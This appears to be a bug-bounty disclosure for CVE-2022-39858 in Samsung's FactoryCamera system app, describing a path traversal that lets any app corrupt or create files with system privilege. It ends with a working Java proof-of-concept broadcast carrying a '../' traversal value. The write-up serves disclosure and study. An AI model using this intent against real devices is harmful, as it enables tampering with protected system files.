# Details

<table>
	<tr>
		<td>Name</td>
		<td>FactoryCamera</td>
	</tr>
	<tr>
		<td>Package name</td>
		<td><code>com.sec.factory.camera</code></td>
	</tr>
	<tr>
		<td>Reported date</td>
		<td>2022.02.07</td>
	</tr>
	<tr>
		<td>Fixed date</td>
		<td>2022.10.04</td>
	</tr>
	<tr>
		<td>Severity</td>
		<td>High</td>
	</tr>
	<tr>
		<td>Handle</td>
		<td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39858">CVE-2022-39858</a> (SVE-2022-0311)</td>
	</tr>
	<tr>
		<td>Reward</td>
		<td>$10310</td>
	</tr>
</table>

# Description

We scanned the FactoryCamera app using the Oversecured mobile vulnerability scanner. This app is internal and is used to test the camera. This app is system because it has the setting `android:sharedUserId="android.uid.system"` in the `AndroidManifest.xml` file and thus works from UID 1000. Any vulnerability in it will lead to much more serious consequences than a vulnerability in a regular app.

Oversecured found the following vulnerability:
![](04%20رئيسية/Samsung%20Vulnerabilities/002.%20FactoryCamera%20—%20Corruption%20of%20arbitrary%20files%20with%20system%20privilege/Oversecured_report.png)

As you can see, when passing `NCAMTEST_211X` test code, the app took the `arg4` parameter, unsafely concatenated it to the path `/sys/class/camera/flash/` and wrote the value `200` there. Thus, an attacker could take advantage of this vulnerability and create any system files where the value `200` would be written or corrupt already existing ones.

**Proof of Concept**
```java
Intent i = new Intent("com.sec.samsungtest.ACTION_CAMERATEST");
i.setClassName("com.sec.factory.camera", "com.sec.android.app.camera.AtBroadcastReceiver");
i.putExtra("testtype", "NCAMTEST");
i.putExtra("arg1", "2");
i.putExtra("arg2", "1");
i.putExtra("arg3", "1");
i.putExtra("arg4", "../../../../../data/system/users/0/evil");
sendBroadcast(i);
```
